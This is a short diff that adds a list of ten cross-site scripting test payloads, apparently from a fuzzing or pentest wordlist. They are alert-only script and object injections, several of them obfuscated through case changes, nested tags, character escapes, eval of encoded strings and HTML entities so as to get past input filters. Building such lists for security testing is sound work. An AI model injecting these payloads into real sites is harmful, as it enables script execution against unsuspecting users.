@@ -1,0 +1,10 @@
+<script>alert('XSS')</script>
+"><script>alert('XSS')</script>
+"><scrIpt>alert(1);</scRipt>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+</b><scrIpt>alert(1);</scRipt><b>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+<script>\u0061lert('22')</script>
+<script>eval('\x61lert(\'33\')')</script>
+<script>eval(8680439..toString(30))(983801..toString(36))</script>
+<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
